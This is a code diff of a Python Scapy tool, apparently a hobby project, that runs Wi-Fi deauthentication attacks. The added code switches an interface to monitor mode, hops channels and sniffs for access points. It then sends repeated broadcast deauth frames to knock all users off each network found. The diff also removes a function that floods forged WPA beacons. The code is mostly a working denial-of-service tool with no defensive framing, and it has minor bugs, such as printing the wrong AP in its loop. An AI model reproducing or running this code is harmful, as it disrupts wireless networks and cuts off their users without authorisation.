@@ -15,19 +15,18 @@ class deauth:
 
 
     def attack(self):
-        print("do stuff")
 
-
-        # Scan for APs
 
         client = "FF:FF:FF:FF:FF:FF"
-        ap = "cc:32:e5:32:4e:b2"
-        # deauth packet for AP
+        for i in range(0, len(self.found_APs)-1):
+            print("Now deauthing all users from " +  self.found_APs[1])
+            ap = self.found_APs[i]
+            # deauth packet for AP
 
-        packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
+            packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
 
-        #interface must be the monitor one
-        sendp(packet, iface=self.valueObj.interfaceName, count=100, inter=0.1 ,verbose=1)
+            #interface must be the monitor one
+            sendp(packet, iface=self.valueObj.interfaceName, count=self.valueObj.count, inter=0.1 ,verbose=1)
 
 
 		
@@ -57,44 +56,17 @@ class deauth:
 
 
     def findAP(self):
+        channel_hop = Process(target = self.channel_hopper)
+        channel_hop.start()
         os.system("ifconfig " + self.valueObj.interfaceName + " down")
         os.system("iwconfig " + self.valueObj.interfaceName + " mode monitor")
         os.system("ifconfig " + self.valueObj.interfaceName + " up")
 
-
-        result = sniff(iface=self.valueObj.interfaceName, prn=self.packet_handler, store=0, timeout=2)
-        print(result)
+        print("Wait 15 seconds whilst discovering APs")
+        result = sniff(iface=self.valueObj.interfaceName, prn=self.packet_handler, store=0, timeout=15)
+        print("The MAC addresses for the found APs: ")
         print(self.found_APs)
+    
 
 
-    def spam(self):
-        sender_mac = str(RandMAC())
-        ssid = ""
-        frames = []
-        if (self.valueObj.SSIDdict == True):
-            # read ssid by eachj thing
-            print("to do")
-        else:
-            ssid = self.valueObj.SSID
-            print(ssid)
-
-
-
-        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
-        beacon = Dot11Beacon(cap="ESS+privacy")
-        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
-        rsn = Dot11Elt(ID='RSNinfo', info=(
-          '\x01\x00'                 #RSN Version 1
-          '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
-          '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
-          '\x00\x0f\xac\x04'         #AES Cipher
-          '\x00\x0f\xac\x02'         #TKIP Cipher
-          '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
-          '\x00\x0f\xac\x02'         #Pre-Shared Key
-          '\x00\x00'))               #RSN Capabilities (no extra capabilities)
-        frame = RadioTap()/dot11/beacon/essid/rsn
-        frames.append(frame)
-        sendp(frames, inter=0.0100, iface=self.valueObj.interfaceName if len(frames)<10 else 0, loop=1)
-
-
-
+    
